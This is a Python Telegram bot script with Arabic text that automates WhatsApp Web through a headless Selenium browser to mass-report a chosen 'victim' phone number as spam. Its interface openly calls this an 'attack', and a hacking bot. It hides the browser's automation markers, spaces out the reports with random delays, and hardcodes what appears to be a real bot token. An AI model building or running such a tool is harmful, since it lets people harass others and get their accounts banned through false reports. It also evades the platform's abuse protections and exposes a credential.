#!/usr/bin/env python3
# whatsapp_reporter_bot.py - إصدار التوكن المباشر

import subprocess
import sys
import os
import time
import random
import re
import threading
import json
import asyncio
from typing import Callable

# ========== ⚠️ ضع توكن البوت هنا مباشرة ⚠️ ==========
BOT_TOKEN = "8751633099:AAEg1NdVnQaT-zgyitP2Hvi4f5YIdQkBQF4"  # <--- استبدله بتوكنك الحقيقي
# =================================================

# ========== التثبيت التلقائي للمكتبات ==========
required_libs = {
    "selenium": "selenium",
    "webdriver_manager": "webdriver-manager",
    "colorama": "colorama",
    "telegram": "python-telegram-bot"
}

def install_missing_libs():
    for lib_name, pip_name in required_libs.items():
        try:
            if lib_name == "telegram":
                __import__("telegram")
            else:
                __import__(lib_name)
            print(f"[✓] {lib_name} موجودة")
        except ImportError:
            print(f"[!] جاري تثبيت {lib_name}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name, "--quiet"])
            print(f"[✓] تم تثبيت {lib_name}")

install_missing_libs()

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from colorama import init, Fore, Style
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

init(autoreset=True)

# ========== باقي الإعدادات ==========
CONFIG_FILE = "config.json"
DEFAULT_CONFIG = {"target": None, "repeats": 3}

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return DEFAULT_CONFIG.copy()

def save_config(config):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=4)

config = load_config()
stop_flag = False
driver_instance = None
status_message = "⚪ غير نشط"
user_target = config.get("target", "")
user_repeats = config.get("repeats", 3)
attack_thread = None

# ========== دوال أداة إرسال البلاغات ==========
def setup_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    return driver

def wait_for_whatsapp(driver, timeout=60):
    try:
        WebDriverWait(driver, timeout).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "div[contenteditable='true']"))
        )
        return True
    except:
        return False

def search_contact(driver, phone_number):
    try:
        clean = re.sub(r'[^0-9]', '', phone_number)
        if not clean.startswith("20") and not clean.startswith("966") and not clean.startswith("1"):
            clean = "20" + clean
        search_box = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[@contenteditable='true'][@data-tab='3']"))
        )
        search_box.click()
        search_box.clear()
        search_box.send_keys(clean)
        time.sleep(2)
        search_box.send_keys("\n")
        time.sleep(3)
        return True
    except Exception as e:
        print(f"{Fore.RED}[-] بحث فاشل: {e}")
        return False

def send_report(driver):
    try:
        menu = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[@role='button'][@aria-label='القائمة']"))
        )
        menu.click()
        time.sleep(1)
        report = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[contains(text(),'إبلاغ') or contains(text(),'Report')]"))
        )
        report.click()
        time.sleep(1)
        spam = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[contains(text(),'بريد عشوائي') or contains(text(),'Spam')]"))
        )
        spam.click()
        time.sleep(1)
        final = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[@role='button'][contains(.,'إبلاغ') or contains(.,'Report')]"))
        )
        final.click()
        time.sleep(2)
        try:
            close = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, "//div[@role='button'][@aria-label='إغلاق']"))
            )
            close.click()
        except:
            pass
        return True
    except Exception as e:
        print(f"{Fore.RED}[-] فشل الإبلاغ: {e}")
        return False

def start_reporting(target: str, repeats: int, update_callback: Callable[[str, str], None]):
    global stop_flag, driver_instance, status_message
    stop_flag = False
    status_message = f"🟢 جارٍ الهجوم على {target}"
    update_callback("status", status_message)
    
    driver = setup_driver()
    driver_instance = driver
    driver.get("https://web.whatsapp.com")
    update_callback("log", "📱 يرجى مسح رمز QR خلال 60 ثانية")
    
    if not wait_for_whatsapp(driver):
        update_callback("log", "❌ فشل تحميل واتساب ويب")
        driver.quit()
        status_message = "⚪ فشل الاتصال"
        update_callback("status", status_message)
        return
    
    update_callback("log", "✅ واتساب ويب جاهز")
    if not search_contact(driver, target):
        update_callback("log", "❌ الرقم غير موجود أو غير صحيح")
        driver.quit()
        status_message = "⚪ الرقم خطأ"
        update_callback("status", status_message)
        return
    
    update_callback("log", f"🎯 تم فتح محادثة {target}")
    success = 0
    for i in range(repeats):
        if stop_flag:
            update_callback("log", "⛔ توقف الهجوم بأمر المستخدم")
            break
        update_callback("log", f"📤 إرسال بلاغ {i+1}/{repeats}")
        if send_report(driver):
            success += 1
            update_callback("log", f"✅ تم البلاغ {i+1}")
        else:
            update_callback("log", f"❌ فشل البلاغ {i+1}")
        if i < repeats-1 and not stop_flag:
            wait = random.randint(15, 30)
            update_callback("log", f"⏳ انتظار {wait} ثانية...")
            time.sleep(wait)
    
    driver.quit()
    driver_instance = None
    status_message = f"✅ انتهى: {success}/{repeats} بلاغات ناجحة"
    update_callback("status", status_message)
    update_callback("log", f"🏁 انتهى الهجوم. نجح {success} من {repeats}")

def stop_reporting() -> str:
    global stop_flag, driver_instance
    stop_flag = True
    if driver_instance:
        try:
            driver_instance.quit()
        except:
            pass
        driver_instance = None
    return "⛔ تم إيقاف الهجوم"

def get_status() -> str:
    return status_message

# ========== دوال البوت ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("🎯 تعيين رقم الضحية"), KeyboardButton("🔢 تعيين عدد البلاغات")],
        [KeyboardButton("🚀 بدء الهجوم"), KeyboardButton("⛔ إيقاف الهجوم")],
        [KeyboardButton("📊 الحالة"), KeyboardButton("⚙️ إعادة تعيين التوكن")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        f"🔥 *بوت إرسال بلاغات واتساب – Shadow Mode* 🔥\n\n"
        f"🎯 الرقم الحالي: `{user_target or 'لم يُحدد'}`\n"
        f"🔢 عدد البلاغات: `{user_repeats}`\n"
        f"📊 الحالة: {get_status()}\n\n"
        f"استخدم الأزرار للتحكم.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def set_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📞 أرسل رقم الضحية بالصيغة الدولية (مثال: 201234567890) بدون +")
    context.user_data["waiting_target"] = True

async def set_repeats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔢 أرسل عدد البلاغات (1-20)")
    context.user_data["waiting_repeats"] = True

async def reset_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔐 لا يمكن تغيير التوكن عبر البوت. عدل المتغير BOT_TOKEN في الكود وأعد التشغيل.")

async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_thread, user_target, user_repeats
    if not user_target:
        await update.message.reply_text("❌ أولاً عين رقم الضحية باستخدام الزر 🎯")
        return
    if get_status().startswith("🟢"):
        await update.message.reply_text("⚠️ هجوم قيد التشغيل بالفعل. أوقفه أولاً.")
        return
    
    def callback(typ, msg):
        asyncio.run_coroutine_threadsafe(send_log(update, typ, msg), context.application.loop)
    
    attack_thread = threading.Thread(target=start_reporting, args=(user_target, user_repeats, callback), daemon=True)
    attack_thread.start()
    await update.message.reply_text(f"🔥 بدأ الهجوم على {user_target} بعدد {user_repeats} بلاغات. انتظر التحديثات...")

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = stop_reporting()
    await update.message.reply_text(msg)

async def send_log(update: Update, typ: str, msg: str):
    if typ == "log":
        await update.message.reply_text(f"📢 {msg}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global user_target, user_repeats, config
    text = update.message.text.strip()
    
    if context.user_data.get("waiting_target"):
        context.user_data["waiting_target"] = False
        user_target = text
        config["target"] = user_target
        save_config(config)
        await update.message.reply_text(f"✅ تم تعيين الرقم: `{user_target}`", parse_mode="Markdown")
        return
    
    if context.user_data.get("waiting_repeats"):
        context.user_data["waiting_repeats"] = False
        try:
            val = int(text)
            if 1 <= val <= 20:
                user_repeats = val
                config["repeats"] = user_repeats
                save_config(config)
                await update.message.reply_text(f"✅ تم تعيين عدد البلاغات: {user_repeats}")
            else:
                await update.message.reply_text("❌ العدد بين 1 و 20 فقط")
        except:
            await update.message.reply_text("❌ أرسل رقماً صحيحاً")
        return
    
    if text == "🎯 تعيين رقم الضحية":
        await set_target(update, context)
    elif text == "🔢 تعيين عدد البلاغات":
        await set_repeats(update, context)
    elif text == "🚀 بدء الهجوم":
        await start_attack(update, context)
    elif text == "⛔ إيقاف الهجوم":
        await stop_attack(update, context)
    elif text == "📊 الحالة":
        await update.message.reply_text(f"📊 الحالة الحالية: {get_status()}")
    elif text == "⚙️ إعادة تعيين التوكن":
        await reset_token(update, context)
    else:
        await update.message.reply_text("❓ استخدم الأزرار من فضلك أو أرسل /start")

def main():
    if not BOT_TOKEN or BOT_TOKEN == "ضع_التوكن_هنا":
        print(f"{Fore.RED}❌ خطأ: لم يتم تعيين BOT_TOKEN بشكل صحيح!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}قم بتعديل المتغير BOT_TOKEN في أعلى الكود.{Style.RESET_ALL}")
        return
    
    global user_target, user_repeats, config
    user_target = config.get("target", "")
    user_repeats = config.get("repeats", 3)
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print(f"{Fore.GREEN}✅ بوت الاختراق شغال...{Style.RESET_ALL}")
    app.run_polling()

if __name__ == "__main__":
    main()
